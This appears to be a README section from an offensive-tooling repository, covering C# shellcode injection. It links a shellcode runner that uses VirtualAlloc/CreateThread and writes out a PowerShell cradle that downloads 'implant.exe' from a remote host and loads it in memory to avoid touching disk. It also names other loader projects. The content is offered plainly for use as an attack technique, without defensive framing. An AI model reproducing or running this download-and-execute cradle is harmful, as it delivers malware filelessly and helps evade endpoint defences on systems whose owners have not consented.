<p align="center">
  <img src="../_resources/img/0003.png">
</p>

# C#

### Table of Contents
  * [Examples](#examples)
  * [Execution](#execution)

## Examples
| File                                           | Description                                                                              |
|------------------------------------------------|------------------------------------------------------------------------------------------|
| [shellcode_runner.cs](src/shellcode_runner.cs) | Inject shellcode into current process using ```VirtualAlloc```/```CreateThread```. |

## Execution
* Simplify execution using PowerShell to Load .Net assemblies without touching disk:
```
$data = (New-Object System.Net.WebClient).DownloadData('http://10.0.0.1/implant.exe');
[System.Reflection.Assembly]::Load($data);
[<program_name>.Program]::Main(<parameters>);
```

* Alternatively, projects such as [EAPrimer](https://github.com/m8r0wn/EAPrimer) and [NetLoader](https://github.com/Flangvik/NetLoader) can be used as well. 